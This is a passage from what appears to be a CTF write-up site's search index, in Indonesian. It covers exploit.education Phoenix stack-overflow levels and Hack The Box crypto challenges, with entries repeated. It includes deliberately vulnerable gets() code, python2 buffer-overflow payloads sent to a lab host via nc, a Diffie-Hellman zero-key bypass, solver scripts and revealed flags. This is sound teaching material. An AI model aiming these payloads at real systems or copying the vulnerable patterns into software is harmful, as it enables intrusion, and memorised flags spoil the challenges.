\" ); exit ( 0 ); } int main ( int argc , char ** argv ) { struct { char buffer [ 64 ]; volatile int ( * fp )(); } locals ; printf ( \"%s \\n \" , BANNER ); locals . fp = NULL ; gets ( locals . buffer ); if ( locals . fp ) { printf ( \"calling function pointer @ %p \\n \" , locals . fp ); fflush ( stdout ); locals . fp (); } else { printf ( \"function pointer remains unmodified :~( better luck next time! \\n \" ); } exit ( 0 ); } Solusi \u00b6 fflush() is typically used for output stream only. Its purpose is to clear (or flush) the output buffer and move the buffered data to console (in case of stdout) or disk (in case of file output stream). Below is its syntax. return oriented programming checksec stack-three Local Remote python2 -c \"import struct; print('a'*64+struct.pack('Q',0x40069d))\" | ./stack-three python2 -c \"import struct; print('a'*64+struct.pack('Q',0x40069d))\" | nc 172 .17.0.2 12345","title":"Stack3"},{"location":"ctf/binex/stack/stack3/#stack-three","text":"","title":"Stack Three"},{"location":"ctf/binex/stack/stack3/#soal","text":"Dapat menggunakan gdb atau objdump untuk membantu proses penyelesaian /* * phoenix/stack-three, by https://exploit.education * * The aim is to change the contents of the changeme variable to 0x0d0a090a * * When does a joke become a dad joke? * When it becomes apparent. * When it's fully groan up. * */ #include <err.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" char * gets ( char * ); void complete_level () { printf ( \"Congratulations, you've finished \" LEVELNAME \" :-) Well done! \\n \" ); exit ( 0 ); } int main ( int argc , char ** argv ) { struct { char buffer [ 64 ]; volatile int ( * fp )(); } locals ; printf ( \"%s \\n \" , BANNER ); locals . fp = NULL ; gets ( locals . buffer ); if ( locals . fp ) { printf ( \"calling function pointer @ %p \\n \" , locals . fp ); fflush ( stdout ); locals . fp (); } else { printf ( \"function pointer remains unmodified :~( better luck next time! \\n \" ); } exit ( 0 ); }","title":"Soal"},{"location":"ctf/binex/stack/stack3/#solusi","text":"fflush() is typically used for output stream only. Its purpose is to clear (or flush) the output buffer and move the buffered data to console (in case of stdout) or disk (in case of file output stream). Below is its syntax. return oriented programming checksec stack-three Local Remote python2 -c \"import struct; print('a'*64+struct.pack('Q',0x40069d))\" | ./stack-three python2 -c \"import struct; print('a'*64+struct.pack('Q',0x40069d))\" | nc 172 .17.0.2 12345","title":"Solusi"},{"location":"ctf/binex/stack/stack4/","text":"Stack Four \u00b6 Soal \u00b6 /* * phoenix/stack-four, by https://exploit.education * * The aim is to execute the function complete_level by modifying the * saved return address, and pointing it to the complete_level() function. * * Why were the apple and orange all alone? Because the bananna split. */ #include <err.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" char * gets ( char * ); void complete_level () { printf ( \"Congratulations, you've finished \" LEVELNAME \" :-) Well done! \\n \" ); exit ( 0 ); } void start_level () { char buffer [ 64 ]; void * ret ; gets ( buffer ); ret = __builtin_return_address ( 0 ); printf ( \"and will be returning to %p \\n \" , ret ); } int main ( int argc , char ** argv ) { printf ( \"%s \\n \" , BANNER ); start_level (); } Solusi \u00b6 Local Remote python2 -c \"import struct; print('a'*64+'a'*24+struct.pack('Q',0x40061d))\" | ./stack-four python2 -c \"import struct; print('a'*64+'a'*24+struct.pack('Q',0x40061d))\" | nc 172 .17.0.2 12345","title":"Stack4"},{"location":"ctf/binex/stack/stack4/#stack-four","text":"","title":"Stack Four"},{"location":"ctf/binex/stack/stack4/#soal","text":"/* * phoenix/stack-four, by https://exploit.education * * The aim is to execute the function complete_level by modifying the * saved return address, and pointing it to the complete_level() function. * * Why were the apple and orange all alone? Because the bananna split. */ #include <err.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" char * gets ( char * ); void complete_level () { printf ( \"Congratulations, you've finished \" LEVELNAME \" :-) Well done! \\n \" ); exit ( 0 ); } void start_level () { char buffer [ 64 ]; void * ret ; gets ( buffer ); ret = __builtin_return_address ( 0 ); printf ( \"and will be returning to %p \\n \" , ret ); } int main ( int argc , char ** argv ) { printf ( \"%s \\n \" , BANNER ); start_level (); }","title":"Soal"},{"location":"ctf/binex/stack/stack4/#solusi","text":"Local Remote python2 -c \"import struct; print('a'*64+'a'*24+struct.pack('Q',0x40061d))\" | ./stack-four python2 -c \"import struct; print('a'*64+'a'*24+struct.pack('Q',0x40061d))\" | nc 172 .17.0.2 12345","title":"Solusi"},{"location":"ctf/binex/stack/stack5/","text":"Stack Five \u00b6 Soal \u00b6 /* * phoenix/stack-five, by https://exploit.education * * Can you execve(\"/bin/sh\", ...) ? * * What is green and goes to summer camp? A brussel scout. */ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" char * gets ( char * ); void start_level () { char buffer [ 128 ]; gets ( buffer ); } int main ( int argc , char ** argv ) { printf ( \"%s \\n \" , BANNER ); start_level (); } Solusi \u00b6 $ file stack-five stack-five: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped $ checksec --file=stack-five RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE No RELRO No canary found NX disabled No PIE RW-RPATH No RUNPATH 56 Symbols No 0 1 stack-five Vuln: No PIE No RELRO No canary found NX disabled","title":"Stack5"},{"location":"ctf/binex/stack/stack5/#stack-five","text":"","title":"Stack Five"},{"location":"ctf/binex/stack/stack5/#soal","text":"/* * phoenix/stack-five, by https://exploit.education * * Can you execve(\"/bin/sh\", ...) ? * * What is green and goes to summer camp? A brussel scout. */ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" char * gets ( char * ); void start_level () { char buffer [ 128 ]; gets ( buffer ); } int main ( int argc , char ** argv ) { printf ( \"%s \\n \" , BANNER ); start_level (); }","title":"Soal"},{"location":"ctf/binex/stack/stack5/#solusi","text":"$ file stack-five stack-five: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped $ checksec --file=stack-five RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE No RELRO No canary found NX disabled No PIE RW-RPATH No RUNPATH 56 Symbols No 0 1 stack-five Vuln: No PIE No RELRO No canary found NX disabled","title":"Solusi"},{"location":"ctf/binex/stack/stack6/","text":"","title":"Stack6"},{"location":"ctf/cpp/","text":"","title":"c++"},{"location":"ctf/php/","text":"","title":"php"},{"location":"ctf/python/linkedlist/","text":"","title":"Linkedlist"},{"location":"ctf/webvuln/","text":"","title":"web vuln"},{"location":"ctf/writeup/comp/ca_aitm/","text":"Android-in-the-Middle \u00b6 source.py from Crypto.Cipher import AES from Crypto.Util.number import long_to_bytes import hashlib import random import socketserver import signal FLAG = \"HTB REDACTED \" DEBUG_MSG = \"DEBUG MSG - \" p = 0x509efab16c5e2772fa00fc180766b6e62c09bdbd65637793c70b6094f6a7bb8189172685d2bddf87564fe2a6bc596ce28867fd7bbc300fd241b8e3348df6a0b076a0b438824517e0a87c38946fa69511f4201505fca11bc08f257e7a4bb009b4f16b34b3c15ec63c55a9dac306f4daa6f4e8b31ae700eba47766d0d907e2b9633a957f19398151111a879563cbe719ddb4a4078dd4ba42ebbf15203d75a4ed3dcd126cb86937222d2ee8bddc973df44435f3f9335f062b7b68c3da300e88bf1013847af1203402a3147b6f7ddab422d29d56fc7dcb8ad7297b04ccc52f7bc5fdd90bf9e36d01902e0e16aa4c387294c1605c6859b40dad12ae28fdfd3250a2e9 g = 2 class Handler ( socketserver . BaseRequestHandler ): def handle ( self ): signal . alarm ( 0 ) main ( self . request ) class ReusableTCPServer ( socketserver . ForkingMixIn , socketserver . TCPServer ): pass def sendMessage ( s , msg ): s . send ( msg . encode ()) def recieveMessage ( s , msg ): sendMessage ( s , msg ) return s . recv ( 4096 ) . decode () . strip () def decrypt ( encrypted , shared_secret ): key = hashlib . md5 ( long_to_bytes ( shared_secret )) . digest () cipher = AES . new ( key , AES . MODE_ECB ) message = cipher . decrypt ( encrypted ) return message def main ( s ): sendMessage ( s , DEBUG_MSG + \"Generating The Global DH Parameters \\n \" ) sendMessage ( s , DEBUG_MSG + f \"g = { g } , p = { p } \\n \" ) sendMessage ( s , DEBUG_MSG + \"Calculation Complete \\n\\n \" ) sendMessage ( s , DEBUG_MSG + \"Generating The Public Key of CPU... \\n \" ) c = random . randrange ( 2 , p - 1 ) C = pow ( g , c , p ) sendMessage ( s , DEBUG_MSG + \"Calculation Complete \\n \" ) sendMessage ( s , DEBUG_MSG + \"Public Key is: ??? \\n\\n \" ) M = recieveMessage ( s , \"Enter The Public Key of The Memory: \" ) try : M = int ( M ) except : sendMessage ( s , DEBUG_MSG + \"Unexpected Error Occured \\n \" ) exit () sendMessage ( s , \" \\n \" + DEBUG_MSG + \"The CPU Calculates The Shared Secret \\n \" ) shared_secret = pow ( M , c , p ) sendMessage ( s , DEBUG_MSG + \"Calculation Complete \\n\\n \" ) encrypted_sequence = recieveMessage ( s , \"Enter The Encrypted Initialization Sequence: \" ) try : encrypted_sequence = bytes . fromhex ( encrypted_sequence ) assert len ( encrypted_sequence ) % 16 == 0 except : sendMessage ( s , DEBUG_MSG + \"Unexpected Error Occured \\n \" ) exit () sequence = decrypt ( encrypted_sequence , shared_secret ) if sequence == b \"Initialization Sequence - Code 0\" : sendMessage ( s , \" \\n \" + DEBUG_MSG + \"Reseting The Protocol With The New Shared Key \\n \" ) sendMessage ( s , DEBUG_MSG + f \" { FLAG } \" ) else : exit () if __name__ == '__main__' : socketserver . TCPServer . allow_reuse_address = True server = ReusableTCPServer (( \"0.0.0.0\" , 1337 ), Handler ) server . serve_forever () Dengan input M = 0, diperoleh decript key yang selalu sama sehingga diperoleh ide penyelesaian key = <input_user_0> decrypted_message = AES.ECB(key).encrypt('Initialization Sequence - Code 0') encrypted_message = AES.ECB(key).decrypt('<decrypted_message>') flag.py from Crypto.Cipher import AES from Crypto.Util.number import long_to_bytes import hashlib import random from base64 import b64encode # M = 0 # shared_secret = pow(M, c, p) shared_secret = 0 key = hashlib . md5 ( long_to_bytes ( shared_secret )) . digest () print ( key ) print ( b64encode ( key )) # dengan bantuan # https://gchq.github.io/CyberChef/#recipe=AES_Encrypt(%7B'option':'Base64','string':'k7iFrf4NoInN9jSQT9WfcQ%3D%3D'%7D,%7B'option':'Hex','string':''%7D,'ECB','Raw','Hex',%7B'option':'Hex','string':''%7D)AES_Decrypt(%7B'option':'Base64','string':'k7iFrf4NoInN9jSQT9WfcQ%3D%3D'%7D,%7B'option':'Hex','string':''%7D,'ECB','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D/disabled)&input=SW5pdGlhbGl6YXRpb24gU2VxdWVuY2UgLSBDb2RlIDA # catatan, hasil operasi cyberchef dengan python berbeda sedikit, tapi dapat dikondisikan # diperoleh enc = bytes . fromhex ( \"1af761314a07bf79f31aeb53bc9e1335e1749e1142b326d82a3c29ac37a042bf\" ) cipher = AES . new ( key , AES . MODE_ECB ) message = cipher . decrypt ( enc ) print ( message ) # jawaban # Enter The Public Key of The Memory: 0 # Enter The Encrypted Initialization Sequence: 1af761314a07bf79f31aeb53bc9e1335e1749e1142b326d82a3c29ac37a042bf $ nc <ip_target> <port> ... Enter The Public Key of The Memory: 0 ... Enter The Encrypted Initialization Sequence: 1af761314a07bf79f31aeb53bc9e1335e1749e1142b326d82a3c29ac37a042bf ... flag HTB{7h15_p2070c0l_15_pr0tec73d_8y_D@nb3er_c0pyr1gh7_1aws}","title":"Android-in-the-Middle"},{"location":"ctf/writeup/comp/ca_aitm/#android-in-the-middle","text":"source.py from Crypto.Cipher import AES from Crypto.Util.number import long_to_bytes import hashlib import random import socketserver import signal FLAG = \"HTB REDACTED \" DEBUG_MSG = \"DEBUG MSG - \" p = 0x509efab16c5e2772fa00fc180766b6e62c09bdbd65637793c70b6094f6a7bb8189172685d2bddf87564fe2a6bc596ce28867fd7bbc300fd241b8e3348df6a0b076a0b438824517e0a87c38946fa69511f4201505fca11bc08f257e7a4bb009b4f16b34b3c15ec63c55a9dac306f4daa6f4e8b31ae700eba47766d0d907e2b9633a957f19398151111a879563cbe719ddb4a4078dd4ba42ebbf15203d75a4ed3dcd126cb86937222d2ee8bddc973df44435f3f9335f062b7b68c3da300e88bf1013847af1203402a3147b6f7ddab422d29d56fc7dcb8ad7297b04ccc52f7bc5fdd90bf9e36d01902e0e16aa4c387294c1605c6859b40dad12ae28fdfd3250a2e9 g = 2 class Handler ( socketserver . BaseRequestHandler ): def handle ( self ): signal . alarm ( 0 ) main ( self . request ) class ReusableTCPServer ( socketserver . ForkingMixIn , socketserver . TCPServer ): pass def sendMessage ( s , msg ): s . send ( msg . encode ()) def recieveMessage ( s , msg ): sendMessage ( s , msg ) return s . recv ( 4096 ) . decode () . strip () def decrypt ( encrypted , shared_secret ): key = hashlib . md5 ( long_to_bytes ( shared_secret )) . digest () cipher = AES . new ( key , AES . MODE_ECB ) message = cipher . decrypt ( encrypted ) return message def main ( s ): sendMessage ( s , DEBUG_MSG + \"Generating The Global DH Parameters \\n \" ) sendMessage ( s , DEBUG_MSG + f \"g = { g } , p = { p } \\n \" ) sendMessage ( s , DEBUG_MSG + \"Calculation Complete \\n\\n \" ) sendMessage ( s , DEBUG_MSG + \"Generating The Public Key of CPU... \\n \" ) c = random . randrange ( 2 , p - 1 ) C = pow ( g , c , p ) sendMessage ( s , DEBUG_MSG + \"Calculation Complete \\n \" ) sendMessage ( s , DEBUG_MSG + \"Public Key is: ??? \\n\\n \" ) M = recieveMessage ( s , \"Enter The Public Key of The Memory: \" ) try : M = int ( M ) except : sendMessage ( s , DEBUG_MSG + \"Unexpected Error Occured \\n \" ) exit () sendMessage ( s , \" \\n \" + DEBUG_MSG + \"The CPU Calculates The Shared Secret \\n \" ) shared_secret = pow ( M , c , p ) sendMessage ( s , DEBUG_MSG + \"Calculation Complete \\n\\n \" ) encrypted_sequence = recieveMessage ( s , \"Enter The Encrypted Initialization Sequence: \" ) try : encrypted_sequence = bytes . fromhex ( encrypted_sequence ) assert len ( encrypted_sequence ) % 16 == 0 except : sendMessage ( s , DEBUG_MSG + \"Unexpected Error Occured \\n \" ) exit () sequence = decrypt ( encrypted_sequence , shared_secret ) if sequence == b \"Initialization Sequence - Code 0\" : sendMessage ( s , \" \\n \" + DEBUG_MSG + \"Reseting The Protocol With The New Shared Key \\n \" ) sendMessage ( s , DEBUG_MSG + f \" { FLAG } \" ) else : exit () if __name__ == '__main__' : socketserver . TCPServer . allow_reuse_address = True server = ReusableTCPServer (( \"0.0.0.0\" , 1337 ), Handler ) server . serve_forever () Dengan input M = 0, diperoleh decript key yang selalu sama sehingga diperoleh ide penyelesaian key = <input_user_0> decrypted_message = AES.ECB(key).encrypt('Initialization Sequence - Code 0') encrypted_message = AES.ECB(key).decrypt('<decrypted_message>') flag.py from Crypto.Cipher import AES from Crypto.Util.number import long_to_bytes import hashlib import random from base64 import b64encode # M = 0 # shared_secret = pow(M, c, p) shared_secret = 0 key = hashlib . md5 ( long_to_bytes ( shared_secret )) . digest () print ( key ) print ( b64encode ( key )) # dengan bantuan # https://gchq.github.io/CyberChef/#recipe=AES_Encrypt(%7B'option':'Base64','string':'k7iFrf4NoInN9jSQT9WfcQ%3D%3D'%7D,%7B'option':'Hex','string':''%7D,'ECB','Raw','Hex',%7B'option':'Hex','string':''%7D)AES_Decrypt(%7B'option':'Base64','string':'k7iFrf4NoInN9jSQT9WfcQ%3D%3D'%7D,%7B'option':'Hex','string':''%7D,'ECB','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D/disabled)&input=SW5pdGlhbGl6YXRpb24gU2VxdWVuY2UgLSBDb2RlIDA # catatan, hasil operasi cyberchef dengan python berbeda sedikit, tapi dapat dikondisikan # diperoleh enc = bytes . fromhex ( \"1af761314a07bf79f31aeb53bc9e1335e1749e1142b326d82a3c29ac37a042bf\" ) cipher = AES . new ( key , AES . MODE_ECB ) message = cipher . decrypt ( enc ) print ( message ) # jawaban # Enter The Public Key of The Memory: 0 # Enter The Encrypted Initialization Sequence: 1af761314a07bf79f31aeb53bc9e1335e1749e1142b326d82a3c29ac37a042bf $ nc <ip_target> <port> ... Enter The Public Key of The Memory: 0 ... Enter The Encrypted Initialization Sequence: 1af761314a07bf79f31aeb53bc9e1335e1749e1142b326d82a3c29ac37a042bf ... flag HTB{7h15_p2070c0l_15_pr0tec73d_8y_D@nb3er_c0pyr1gh7_1aws}","title":"Android-in-the-Middle"},{"location":"ctf/writeup/comp/ca_htcht/","text":"How The Columns Have Turned \u00b6 source.py dialog.txt ecnripted_messages.txt import os with open ( 'super_secret_messages.txt' , 'r' ) as f : SUPER_SECRET_MESSAGES = [ msg . strip () for msg in f . readlines ()] def deriveKey ( key ): derived_key = [] for i , char in enumerate ( key ): previous_letters = key [: i ] new_number = 1 for j , previous_char in enumerate ( previous_letters ): if previous_char > char : derived_key [ j ] += 1 else : new_number += 1 derived_key . append ( new_number ) return derived_key def transpose ( array ): return [ row for row in map ( list , zip ( * array ))] def flatten ( array ): return \"\" . join ([ i for sub in array for i in sub ]) def twistedColumnarEncrypt ( pt , key ): derived_key = deriveKey ( key ) width = len ( key ) blocks = [ pt [ i : i + width ] for i in range ( 0 , len ( pt ), width )] blocks = transpose ( blocks ) ct = [ blocks [ derived_key . index ( i + 1 )][:: - 1 ] for i in range ( width )] ct = flatten ( ct ) return ct class PRNG : def __init__ ( self , seed ): self . p = 0x2ea250216d705 self . a = self . p self . b = int . from_bytes ( os . urandom ( 16 ), 'big' ) self . rn = seed def next ( self ): self . rn = (( self . a * self . rn ) + self . b ) % self . p return self . rn def main (): seed = int . from_bytes ( os . urandom ( 16 ), 'big' ) rng = PRNG ( seed ) cts = \"\" for message in SUPER_SECRET_MESSAGES : key = str ( rng . next ()) ct = twistedColumnarEncrypt ( message , key ) cts += ct + \" \\n \" with open ( 'encrypted_messages.txt' , 'w' ) as f : f . write ( cts ) dialog = \"Miyuki says: \\n \" dialog += \"Klaus it's your time to sign! \\n \" dialog += \"All we have is the last key of this wierd encryption scheme. \\n \" dialog += \"Please do your magic, we need to gather more information if we want to defeat Draeger. \\n \" dialog += f \"The key is: { str ( key ) } \\n \" with open ( 'dialog.txt' , 'w' ) as f : f . write ( dialog ) if __name__ == '__main__' : main () Miyuki says: Klaus it's your time to sign! All we have is the last key of this wierd encryption scheme. Please do your magic, we need to gather more information if we want to defeat Draeger. The key is: 729513912306026 VEOAOTNRDCEEIFHIVHMVOETYDEDTESTHTCHLSRPDAIYAATOSTEGIIIOCIPYLTNOTLRTRNLEEUNBEOSFNANDHTUFTEETREEEEOEDHNRNYA AAVPDESEETURAFFDUCEDAEECNEMOROCEANHPTTGROITCYSSSETTSKTTRLRIUAVSONOISECNJISAFAATAPATWORIRCETYUIPUEEHHAIHOG NABPSVKELHRIALDVEHLORCNNOERUNGTAEEEHEHDORLIEEAOTITUTEAUEARTEFISESGTAYAGBTHCEOTWLSNTWECESHHBEIOYPNCOLICCAF NIRYHFTOSSNPECMPNWSHFSNUTCAGOOAOTGOITRAEREPEEPWLHIPTAPEOOHPNSKTSAATETTPSIUIUOORSLEOAITEDFNDUHSNHENSESNADR NUTFAUPNKROEOGNONSRSUWFAFDDSAAEDAIFAYNEGYSGIMMYTAANSUOEMROTRROUIIOODLOIRERVTAMNITAHIDNHRENIFTCTNLYLOTFINE flag.py def deriveKey ( key ): derived_key = [] for i , char in enumerate ( key ): previous_letters = key [: i ] new_number = 1 for j , previous_char in enumerate ( previous_letters ): if previous_char > char : derived_key [ j ] += 1 else : new_number += 1 derived_key . append ( new_number ) return derived_key cts = [] cts . append ( \"VEOAOTNRDCEEIFHIVHMVOETYDEDTESTHTCHLSRPDAIYAATOSTEGIIIOCIPYLTNOTLRTRNLEEUNBEOSFNANDHTUFTEETREEEEOEDHNRNYA\" ) cts . append ( \"AAVPDESEETURAFFDUCEDAEECNEMOROCEANHPTTGROITCYSSSETTSKTTRLRIUAVSONOISECNJISAFAATAPATWORIRCETYUIPUEEHHAIHOG\" ) cts . append ( \"NABPSVKELHRIALDVEHLORCNNOERUNGTAEEEHEHDORLIEEAOTITUTEAUEARTEFISESGTAYAGBTHCEOTWLSNTWECESHHBEIOYPNCOLICCAF\" ) cts . append ( \"NIRYHFTOSSNPECMPNWSHFSNUTCAGOOAOTGOITRAEREPEEPWLHIPTAPEOOHPNSKTSAATETTPSIUIUOORSLEOAITEDFNDUHSNHENSESNADR\" ) cts . append ( \"NUTFAUPNKROEOGNONSRSUWFAFDDSAAEDAIFAYNEGYSGIMMYTAANSUOEMROTRROUIIOODLOIRERVTAMNITAHIDNHRENIFTCTNLYLOTFINE\" ) blocks = [ list ( i [ j : j + 7 ])[:: - 1 ] for i in cts for j in range ( 0 , len ( i ), 7 )] # print(blocks) key = '729513912306026' derived_key = deriveKey ( key ) print ( derived_key ) rearange = [ derived_key . index ( i + 1 ) for i in range ( len ( key ))] print ( rearange ) arr_new = [] for i in range ( 0 , len ( blocks ), len ( key )): for j in range ( len ( key )): arr_new . append ( blocks [ rearange . index ( j ) + i ]) print ( arr_new ) for i in range ( 7 ): for j in arr_new : print ( j [ i ], end = '' ) # THELOCATIONOFTH THECARGOISSAFEW BECAREFULSKOLIW DONTFORGETTOCHA IFYOUMESSUPAGAI ECONVOYDANTEISD ENEEDTOMOVEFAST HENYOUARRIVEATT NGETHEDARKFUELO NILLSENDYOUTOTH ETERMINEDTOBEON CAUSETHERADARSA HEPALACEOFSCION FTHESPACESHIPWE EANDROIDGRAVEYA THETHIRDPLANETA REPICKINGUPSUSP SAYTHECODEPHRAS DONTWANTANYUNPL RDTOSUFFERFROMT FTERVINYRYOUCAN ICIOUSACTIVITYA ETOGETINHTBTHEL EASANTSURPRISES HECONSTANTTERMI USELIGHTSPEEDAF ROUNDTHETRAJECT CGISVULNERABLEW TOHAPPENTHISSER NATIONOFYOURKIN TERTHEDELIVERYS ORYOFTHEPLANETA ENEEDTOCHANGEIT IOUSMISSIONPOPO DAFINALWARNINGM # solved with the help of a column turned miracle :) # THELOCATIONOFTH THECARGOISSAFEW BECAREFULSKOLIW DONTFORGETTOCHA IFYOUMESSUPAGAI # ECONVOYDANTEISD ENEEDTOMOVEFAST HENYOUARRIVEATT NGETHEDARKFUELO NILLSENDYOUTOTH # ETERMINEDTOBEON CAUSETHERADARSA HEPALACEOFSCION FTHESPACESHIPWE EANDROIDGRAVEYA # THETHIRDPLANETA REPICKINGUPSUSP SAYTHECODEPHRAS DONTWANTANYUNPL RDTOSUFFERFROMT # FTERVINYRYOUCAN ICIOUSACTIVITYA ETOGETINHTBTHEL EASANTSURPRISES HECONSTANTTERMI # USELIGHTSPEEDAF ROUNDTHETRAJECT CGISVULNERABLEW TOHAPPENTHISSER NATIONOFYOURKIN # TERTHEDELIVERYS ORYOFTHEPLANETA ENEEDTOCHANGEIT IOUSMISSIONPOPO DAFINALWARNINGM # HTB{THELCGISVULNERABLEWENEEDTOCHANGEIT} flag HTB{THELCGISVULNERABLEWENEEDTOCHANGEIT}","title":"How The Columns Have Turned"},{"location":"ctf/writeup/comp/ca_htcht/#how-the-columns-have-turned","text":"source.py dialog.txt ecnripted_messages.txt import os with open ( 'super_secret_messages.txt' , 'r' ) as f : SUPER_SECRET_MESSAGES = [ msg . strip () for msg in f . readlines ()] def deriveKey ( key ): derived_key = [] for i , char in enumerate ( key ): previous_letters = key [: i ] new_number = 1 for j , previous_char in enumerate ( previous_letters ): if previous_char > char : derived_key [ j ] += 1 else : new_number += 1 derived_key . append ( new_number ) return derived_key def transpose ( array ): return [ row for row in map ( list , zip ( * array ))] def flatten ( array ): return \"\" . join ([ i for sub in array for i in sub ]) def twistedColumnarEncrypt ( pt , key ): derived_key = deriveKey ( key ) width = len ( key ) blocks = [ pt [ i : i + width ] for i in range ( 0 , len ( pt ), width )] blocks = transpose ( blocks ) ct = [ blocks [ derived_key . index ( i + 1 )][:: - 1 ] for i in range ( width )] ct = flatten ( ct ) return ct class PRNG : def __init__ ( self , seed ): self . p = 0x2ea250216d705 self . a = self . p self . b = int . from_bytes ( os . urandom ( 16 ), 'big' ) self . rn = seed def next ( self ): self . rn = (( self . a * self . rn ) + self . b ) % self . p return self . rn def main (): seed = int . from_bytes ( os . urandom ( 16 ), 'big' ) rng = PRNG ( seed ) cts = \"\" for message in SUPER_SECRET_MESSAGES : key = str ( rng . next ()) ct = twistedColumnarEncrypt ( message , key ) cts += ct + \" \\n \" with open ( 'encrypted_messages.txt' , 'w' ) as f : f . write ( cts ) dialog = \"Miyuki says: \\n \" dialog += \"Klaus it's your time to sign! \\n \" dialog += \"All we have is the last key of this wierd encryption scheme. \\n \" dialog += \"Please do your magic, we need to gather more information if we want to defeat Draeger. \\n \" dialog += f \"The key is: { str ( key ) } \\n \" with open ( 'dialog.txt' , 'w' ) as f : f . write ( dialog ) if __name__ == '__main__' : main () Miyuki says: Klaus it's your time to sign! All we have is the last key of this wierd encryption scheme. Please do your magic, we need to gather more information if we want to defeat Draeger. The key is: 729513912306026 VEOAOTNRDCEEIFHIVHMVOETYDEDTESTHTCHLSRPDAIYAATOSTEGIIIOCIPYLTNOTLRTRNLEEUNBEOSFNANDHTUFTEETREEEEOEDHNRNYA AAVPDESEETURAFFDUCEDAEECNEMOROCEANHPTTGROITCYSSSETTSKTTRLRIUAVSONOISECNJISAFAATAPATWORIRCETYUIPUEEHHAIHOG NABPSVKELHRIALDVEHLORCNNOERUNGTAEEEHEHDORLIEEAOTITUTEAUEARTEFISESGTAYAGBTHCEOTWLSNTWECESHHBEIOYPNCOLICCAF NIRYHFTOSSNPECMPNWSHFSNUTCAGOOAOTGOITRAEREPEEPWLHIPTAPEOOHPNSKTSAATETTPSIUIUOORSLEOAITEDFNDUHSNHENSESNADR NUTFAUPNKROEOGNONSRSUWFAFDDSAAEDAIFAYNEGYSGIMMYTAANSUOEMROTRROUIIOODLOIRERVTAMNITAHIDNHRENIFTCTNLYLOTFINE flag.py def deriveKey ( key ): derived_key = [] for i , char in enumerate ( key ): previous_letters = key [: i ] new_number = 1 for j , previous_char in enumerate ( previous_letters ): if previous_char > char : derived_key [ j ] += 1 else : new_number += 1 derived_key . append ( new_number ) return derived_key cts = [] cts . append ( \"VEOAOTNRDCEEIFHIVHMVOETYDEDTESTHTCHLSRPDAIYAATOSTEGIIIOCIPYLTNOTLRTRNLEEUNBEOSFNANDHTUFTEETREEEEOEDHNRNYA\" ) cts . append ( \"AAVPDESEETURAFFDUCEDAEECNEMOROCEANHPTTGROITCYSSSETTSKTTRLRIUAVSONOISECNJISAFAATAPATWORIRCETYUIPUEEHHAIHOG\" ) cts . append ( \"NABPSVKELHRIALDVEHLORCNNOERUNGTAEEEHEHDORLIEEAOTITUTEAUEARTEFISESGTAYAGBTHCEOTWLSNTWECESHHBEIOYPNCOLICCAF\" ) cts . append ( \"NIRYHFTOSSNPECMPNWSHFSNUTCAGOOAOTGOITRAEREPEEPWLHIPTAPEOOHPNSKTSAATETTPSIUIUOORSLEOAITEDFNDUHSNHENSESNADR\" ) cts . append ( \"NUTFAUPNKROEOGNONSRSUWFAFDDSAAEDAIFAYNEGYSGIMMYTAANSUOEMROTRROUIIOODLOIRERVTAMNITAHIDNHRENIFTCTNLYLOTFINE\" ) blocks = [ list ( i [ j : j + 7 ])[:: - 1 ] for i in cts for j in range ( 0 , len ( i ), 7 )] # print(blocks) key = '729513912306026' derived_key = deriveKey ( key ) print ( derived_key ) rearange = [ derived_key . index ( i + 1 ) for i in range ( len ( key ))] print ( rearange ) arr_new = [] for i in range ( 0 , len ( blocks ), len ( key )): for j in range ( len ( key )): arr_new . append ( blocks [ rearange . index ( j ) + i ]) print ( arr_new ) for i in range ( 7 ): for j in arr_new : print ( j [ i ], end = '' ) # THELOCATIONOFTH THECARGOISSAFEW BECAREFULSKOLIW DONTFORGETTOCHA IFYOUMESSUPAGAI ECONVOYDANTEISD ENEEDTOMOVEFAST HENYOUARRIVEATT NGETHEDARKFUELO NILLSENDYOUTOTH ETERMINEDTOBEON CAUSETHERADARSA HEPALACEOFSCION FTHESPACESHIPWE EANDROIDGRAVEYA THETHIRDPLANETA REPICKINGUPSUSP SAYTHECODEPHRAS DONTWANTANYUNPL RDTOSUFFERFROMT FTERVINYRYOUCAN ICIOUSACTIVITYA ETOGETINHTBTHEL EASANTSURPRISES HECONSTANTTERMI USELIGHTSPEEDAF ROUNDTHETRAJECT CGISVULNERABLEW TOHAPPENTHISSER NATIONOFYOURKIN TERTHEDELIVERYS ORYOFTHEPLANETA ENEEDTOCHANGEIT IOUSMISSIONPOPO DAFINALWARNINGM # solved with the help of a column turned miracle :) # THELOCATIONOFTH THECARGOISSAFEW BECAREFULSKOLIW DONTFORGETTOCHA IFYOUMESSUPAGAI # ECONVOYDANTEISD ENEEDTOMOVEFAST HENYOUARRIVEATT NGETHEDARKFUELO NILLSENDYOUTOTH # ETERMINEDTOBEON CAUSETHERADARSA HEPALACEOFSCION FTHESPACESHIPWE EANDROIDGRAVEYA # THETHIRDPLANETA REPICKINGUPSUSP SAYTHECODEPHRAS DONTWANTANYUNPL RDTOSUFFERFROMT # FTERVINYRYOUCAN ICIOUSACTIVITYA ETOGETINHTBTHEL EASANTSURPRISES HECONSTANTTERMI # USELIGHTSPEEDAF 